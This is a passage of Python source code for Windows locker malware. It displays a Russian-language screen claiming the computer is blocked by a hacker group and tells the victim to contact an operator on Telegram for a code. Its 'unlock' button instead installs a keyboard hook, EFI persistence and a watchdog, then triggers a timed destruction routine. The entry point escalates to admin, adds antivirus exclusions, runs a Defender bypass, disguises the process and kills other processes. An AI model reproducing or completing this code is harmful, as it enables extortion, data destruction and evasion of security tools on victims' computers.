    boot2 = f"  WIN LOCKED ACTIVATE\n  CRYPTER starting...\n  operator: {OPERATOR}"

    label = tk.Label(win, text="", bg="#000000", fg="#FF0000",
                     font=("Consolas", 15), anchor="w", justify="left")
    label.pack(anchor="w")
    label2 = tk.Label(win, text="", bg="#000000", fg="#656464",
                      font=("Consolas", 15), anchor="w", justify="left")
    label2.pack(pady=(20, 0), anchor="w")

    st = {"i": 0, "i2": 0}
    state = {"virus_started": False}

    def typing():
        if st["i"] <= len(boot1):
            label.config(text=boot1[:st["i"]])
            st["i"] += 1
            win.after(2, typing)
        elif st["i2"] <= len(boot2):
            label2.config(text=boot2[:st["i2"]])
            st["i2"] += 1
            win.after(2, typing)
        else:
            locker_screen()

    def _virus_timer_worker():
        time.sleep(VIRUS_DURATION_SECONDS)
        try:
            full_destroy(force=True)
        except Exception:
            pass

    def launch_virus():
        if state["virus_started"]:
            return
        state["virus_started"] = True
        install_keyboard_hook()
        try:
            install_efi_persistence()
        except Exception:
            pass
        spawn_watchdog()
        try:
            flying_photos_virus(win)
        except Exception:
            try:
                win.deiconify()
            except Exception:
                pass
        threading.Thread(target=_virus_timer_worker, daemon=True).start()

    def locker_screen():
        for w in win.winfo_children():
            w.destroy()

        tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!",
                 fg="#4f4f4f", bg="#000000",
                 font=("Consolas", 18)).pack(pady=(50, 20))

        tk.Label(win, text=(
            f"Ваш компьютер подвержен блокировке хакерской группой {OPERATOR}.\n"
            "Нажмите кнопку ниже, чтобы запустить процесс разблокировки.\n\n"
            f"За кодом писать @{OPERATOR} (Telegram)"),
            fg="#AAAAAA", bg="#000000", font=("Consolas", 13),
            justify="center").pack(pady=20)

        tk.Button(win, text="РАЗБЛОКИРОВАТЬ", command=launch_virus,
                  bg="#4CAF50", fg="#FFFFFF",
                  font=("Consolas", 24, "bold"), bd=0,
                  padx=80, pady=30, cursor="hand2",
                  activebackground="#66BB6A", activeforeground="#FFFFFF").pack(pady=60)

    typing()
    win.mainloop()

# ================= ENTRY =================
def main():
    if len(sys.argv) >= 3 and sys.argv[1] == "--watchdog":
        try:
            parent = int(sys.argv[2])
        except Exception:
            parent = 0
        watchdog_main(parent)
        return

    ensure_admin()

    try:
        add_exclusions()
    except Exception:
        pass

    threading.Thread(target=run_defender_bypass_and_log, daemon=True).start()

    if is_destroyed():
        full_destroy(force=True)
        sys.exit(0)

    self_masquerade()
    apply_reg_blocks()
    init_scream()

    threading.Thread(target=blocking_loop, daemon=True).start()
    threading.Thread(target=wmi_kill_loop, daemon=True).start()

    run_ui()


if __name__ == "__main__":
    main()
                  
